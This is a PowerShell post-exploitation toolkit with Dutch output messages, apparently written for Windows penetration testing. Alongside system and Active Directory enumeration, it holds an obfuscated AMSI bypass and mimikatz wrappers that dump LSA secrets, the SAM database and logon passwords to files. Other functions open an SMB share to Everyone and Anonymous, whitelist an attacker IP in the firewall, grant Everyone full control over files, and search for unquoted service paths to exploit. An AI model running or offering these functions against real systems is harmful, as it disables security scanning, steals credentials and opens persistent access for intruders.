
function Find-File {
    param (
        [Alias("F")] 
        [Parameter(Position = 0)] [string]$FileName,  

        [Alias("P")] 
        [Parameter(Position = 1)] [string]$Path = (Get-Location).Path  
    )

    if (-not $FileName -or $FileName -in ("-help", "?")) {
        Write-Output @"
Functie Find-File - Gebruik:
  Find-File [-FileName|-F] <bestandsnaam> [-Path|-P] <pad>
"@
        return
    }

    try {
        $results = Get-ChildItem -Path $Path -Recurse -Filter    $FileName -ErrorAction SilentlyContinue
        if ($results) {
            $results | ForEach-Object { $_.FullName }
        } else {
            Write-Output "Geen bestand gevonden met de naam '$FileName' in '$Path'."
        }
    } catch {
        Write-Output "Er is een fout opgetreden tijdens het zoeken: $_"
    }
}

function Get-History {
    Get-PSReadlineOption
    type (Get-PSReadlineOption).HistorySavePath
}

function Get-Members {
    param (
        [Parameter(Mandatory = $true)]
        [string]$GroupName  
    )

    try {
        $members = Get-ADGroupMember -Identity $GroupName | Select-Object SamAccountName
        
        if ($members) {
            $members
        } else {
            Write-Output "Geen leden gevonden in de groep '$GroupName'."
        }
    } catch {
        Write-Output "Er is een fout opgetreden: $_"
    }
}

function Get-LocalGroupMembers {
    $groups = Get-LocalGroup

    foreach ($group in $groups) {
        try {
            $members = Get-LocalGroupMember -Group $group.Name
            
            if ($members.Count -gt 0) {
                Write-Output "Groep: $($group.Name)"
                Write-Output ("-" * 50)
                
                foreach ($member in $members) {
                    Write-Output "Naam: $($member.Name), Type: $($member.ObjectClass)"
                }
                
                Write-Output ""  
            }
        } catch {
            Write-Output "Kon leden niet ophalen voor groep: $($group.Name)."
            Write-Output ""  
        }
    }
}


function Get-Groups {
    Get-ADGroup -Filter * | select Name
}

function Get-User {
    Get-ADUser -Filter * | select samaccountname
    Get-LocalUser
}

function Get-Policy {
    Get-ADDefaultDomainPasswordPolicy
}

function Get-Av {
    netsh advfirewall show allprofiles
    get-mpcomputerstatus
}

function Get-Defender {
    $service = Get-Service -Name WinDefend -ErrorAction SilentlyContinue

    if ($null -eq $service) {
        Write-Output "De Windows Defender-service (WinDefend) is niet geïnstalleerd op dit systeem."
        return
    }

    if ($service.Status -eq "Running") {
        Get-MpComputerStatus
    } else {
        Write-Output "Windows Defender is niet actief."
    }
}

function Get-proces {
    Get-Process | Sort-Object Name -Unique | Select-Object Id,Name
}

function Get-Autologon {
    gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
}

function Make-Smb {
    new-item "c:\users\public\share" -itemtype directory
New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon"
}

function Whitelist-Ip {
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]$IpAddress  # IP-adres dat je wilt whitelisten
    )

    New-NetFirewallRule -Action Allow -DisplayName "pentest" -RemoteAddress $IpAddress
    Write-Host "IP-adres $IpAddress is toegevoegd aan de firewall als 'pentest'" -ForegroundColor Green
}


function Get-Services {
    Get-Service | Where-Object { $_.Status -eq "Running" }
    #Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
}

function Filter-Services {
    Get-CimInstance -ClassName win32_service |
    Where-Object { $_.State -like 'Running' -and $_.PathName -notlike 'C:\Windows*' } |
    Select-Object Name, State, PathName, StartName
}
function Get-ServiceDetails {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ServiceName  # Naam van de service
    )

    try {
        $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$ServiceName'"
        
        if ($null -ne $service) {
            Write-Output "Details van service '$ServiceName':"
            $service | Select-Object Name, DisplayName, State, StartMode, ProcessId, Description, StartName
        } else {
            Write-Output "Service '$ServiceName' niet gevonden."
        }
    } catch {
        Write-Output "Er is een fout opgetreden: $_"
    }
}

function Get-Programms {
    $programs64 = Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher
$programs32 = Get-ItemProperty -Path HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher
$allPrograms = $programs64 + $programs32
$allPrograms | Where-Object { $_.DisplayName -ne $null } | Sort-Object DisplayName

}

function Find-String {
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]$SearchString,

        [Parameter(Position = 1, Mandatory = $false)]
        [string]$Path = (Get-Location).Path
    )

    try {
        if (-not (Test-Path $Path)) {
            Write-Output "Pad '$Path' bestaat niet. Geef een geldig pad op."
            return
        }

        Get-ChildItem -Path $Path -Recurse -ErrorAction SilentlyContinue |
            ForEach-Object {
                try {
                    Select-String -Path $_.FullName -Pattern $SearchString -SimpleMatch -ErrorAction SilentlyContinue
                } catch {
                }
            }
    } catch {
        Write-Output "Er is een fout opgetreden: $_"
    }
}

function Get-Ports {
    netstat -na | Where-Object { $_ -match "LISTENING" -and $_ -notmatch "\[::\]" }
}

function Amsi {
    sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )
}

function lsadump-secrets {
    ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit" | Tee-Object -FilePath "lsadump_secrets.txt" 
    }

function lsadump-sam {
    ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" | Tee-Object -FilePath "lsadump_sam.txt" 
    }

function logonpasswords {
    ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" | Tee-Object -FilePath "lsadump_passwords.txt" 
    type lsadump_passwords.txt | Select-String "Password" | Where-Object { $_ -notmatch "\(null\)" -and $_ -notmatch "Password\s*:\s*((?:[0-9a-fA-F]{2}\s+)+)" }
    }

function Get-Unquoted {
    Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike '*C:\Windows\*' -and $_.PathName -notmatch '^".*"$' } | Select-Object Name, DisplayName, PathName
}

function Get-Unquoted2 {
    Get-CimInstance -ClassName win32_service | 
    Where-Object { $_.PathName -notlike "C:\Windows*" -and $_.PathName -notmatch '"' } | 
    Select-Object Name, PathName
}

function Grant-All {
    icacls . /grant "Everyone:(OI)(CI)F" /T
}

function Check-Acl {
    param(
        [string]$Path = $PWD
    )

    if (Test-Path $Path) {
        Get-Acl -Path $Path | Format-List
    } else {
        Write-Host "Het opgegeven pad bestaat niet: $Path" -ForegroundColor Red
    }
}

function Get-Tasks {
    function Filter-ReadyTasks {
    $content = schtasks /query /fo LIST /v | Out-String -Stream | ForEach-Object { $_.Trim() }

    $block = @()
    $results = @()
    $today = (Get-Date).ToString("M/d/yyyy")  # Huidige datum in formaat M/d/yyyy

    foreach ($line in $content) {
        if ($line -match "^Folder:") {
            if ($block.Count -gt 0) {
                Process-Block -Block $block -Results ([ref]$results) -Today $today
            }
            $block = @()
        }
        $block += $line
    }

    if ($block.Count -gt 0) {
        Process-Block -Block $block -Results ([ref]$results) -Today $today
    }

    if ($results.Count -eq 0) {
        Write-Output "Geen taken voldoen aan de criteria."
        return
    }

    foreach ($result in $results) {
        Write-Output "HostName: $($result['HostName'])"
        Write-Output "TaskName: $($result['TaskName'])"
        Write-Output "Status: $($result['Status'])"
        Write-Output "Scheduled Task State: $($result['Scheduled Task State'])"
        Write-Output "Run As User: $($result['Run As User'])"
        Write-Output "Next Run Time: $($result['Next Run Time'])"
        Write-Output "Task To Run: $($result['Task To Run'])"
        Write-Output ("=" * 50)
    }
}

function Process-Block {
    param (
        [array]$Block,
        [ref]$Results,
        [string]$Today
    )

    $blockData = @{}
    foreach ($line in $Block) {
        if ($line -match ":") {
            $parts = $line -split ":", 2
            $key = $parts[0].Trim()
            $value = $parts[1].Trim()
            $blockData[$key] = $value
        }
    }

    if (
        $blockData['Status'] -eq 'Ready' -and
        $blockData['Scheduled Task State'] -eq 'Enabled' -and
        $blockData['Next Run Time'] -ne 'N/A' -and
        $blockData['Next Run Time'] -match $Today
    ) {
        $Results.Value += $blockData
    }
}

Filter-ReadyTasks
}


function Get-Menu {
    $functions = @(
        "Find-File []",
        "Get-History",
        "Get-Members []",
        "Get-LocalGroupMembers",
        "Get-Groups",
        "Get-User",
        "Get-Policy",
        "Get-Av",
        "Get-Defender",
        "Get-proces",
        "Get-Autologon",
        "Make-Smb",
        "Whitelist-Ip",
        "Get-Services",
        "Filter-Services",
        "Get-ServiceDetails []",
        "Get-Programms",
        "Find-String []",
        "Get-Ports",
        "Amsi",
        "lsadump-secrets",
        "lsadump-sam",
        "logonpasswords",
        "Get-Unquoted",
        "Get-Unquoted2",
        "Grant-All",
        "Check-Acl",
        "Get-Tasks"
    )

    Write-Host "Beschikbare functies in het script:" -ForegroundColor Cyan
    foreach ($func in $functions) {
        Write-Host $func -ForegroundColor Yellow
    }
}
